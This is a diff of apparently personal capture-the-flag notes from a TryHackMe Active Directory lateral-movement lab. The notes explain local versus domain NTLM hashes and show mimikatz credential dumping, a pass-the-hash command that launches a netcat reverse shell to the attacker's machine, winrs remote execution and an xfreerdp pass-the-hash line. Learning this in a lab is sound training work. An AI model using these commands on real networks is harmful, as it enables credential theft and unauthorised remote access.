@@ -920,14 +920,89 @@ SAMKey : 9a74a253f756d6b012b7ee3d0436f77a
 RID  : 000001f4 (500)                                                       
 User : Administrator                                                        
   Hash NTLM: 0b2571be7e75e3dbd169ca5352a2dad7                               
-                                                                            
-RID  : 000001f5 (501)                                                       
-User : Guest                                                                
-                                                                            
-RID  : 000001f7 (503)                                                       
-User : DefaultAccount                                                       
+...                                               
 ```
-The use one of the RDP options to use the has such as:
+#Administrator in this case
+The Administrator NTLM hash is unique per machine, even inside a domain.
+That’s exactly why the Administrator hash you dumped on THMJMP2 will NOT work on THMIIS or any other host.
+
+**Local accounts:**
+- live in the local SAM database
+- have unique NTLM hashes per machine
+- do not replicate across the domain
+- only authenticate to that specific host
+
+Why t1_toby.beck NTLM hash does work across machines
+Because t1_toby.beck is a domain account.
+Can be obtained with sekulsa::MSV. Will show toby.beck has several with same value NTLM hash, this just shows its a different login session (name name1 name2)
+```
+mimikatz # sekurlsa::msv                                                    
+...
+Authentication Id : 0 ; 446414 (00000000:0006cfce)                          
+Session           : RemoteInteractive from 2                                
+User Name         : t1_toby.beck                                            
+Domain            : ZA                                                      
+Logon Server      : THMDC                                                   
+Logon Time        : 7/5/2026 4:22:45 PM                                     
+SID               : S-1-5-21-3330634377-1326264276-632209373-4607           
+        msv :                                                               
+         [00000003] Primary                                                 
+         * Username : t1_toby.beck                                          
+         * Domain   : ZA                                                    
+         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe                      
+         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38              
+         * DPAPI    : d9cd92937c7401805389fbb51260c45f
+```
+Then use to connect
+```
+mimikatz #          mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:5
+33f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.150.74
+.7 5555"                                                                    
+user    : t1_toby.beck                                                      
+domain  : za.tryhackme.com                                                  
+program : c:\tools\nc64.exe -e cmd.exe 10.150.74.7 5555                     
+impers. : no                                                                
+NTLM    : 533f1bd576caa912bdb9da284bbc60fe                                  
+  |  PID  2888                                                              
+  |  TID  9548                                                              
+  |  LSA Process is now R/W                                                 
+  |  LUID 0 ; 3135876 (00000000:002fd984)                                   
+  \_ msv1_0   - data copy @ 0000024D05585F40 : OK !                         
+  \_ kerberos - data copy @ 0000024D061A6EF8                                
+   \_ aes256_hmac       -> null                                             
+   \_ aes128_hmac       -> null                                             
+   \_ rc4_hmac_nt       OK                                                  
+   \_ rc4_hmac_old      OK                                                  
+   \_ rc4_md4           OK                                                  
+   \_ rc4_hmac_nt_exp   OK                                                  
+   \_ rc4_hmac_old_exp  OK                                                  
+   \_ *Password replace @ 0000024D0621FFB8 (32) -> null                     
+                                                                            
+mimikatz #
+# Then from the attack vm  run nv -lnvp 5555
+┌──(hacktopuser㉿hacktop)-[~/CTF_TOOLS/Lateral_Movement_and_Pivoting]
+└─$ nc -lnvp 5555                  
+listening on [any] 5555 ...
+connect to [10.150.74.7] from (UNKNOWN) [10.200.74.249] 64712
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+za\t2_felicia.dean
+
+# this is normal but can access files from toby.beck
+
+C:\Windows\system32>winrs.exe -r:THMIIS.za.tryhackme.com cmd
+Microsoft Windows [Version 10.0.17763.1098]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\t1_toby.beck>cd desktop
+
+C:\Users\t1_toby.beck\Desktop>flag.exe
+THM{NO_PASSWORD_NEEDED}
+```
+
 ```
 xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
 ```
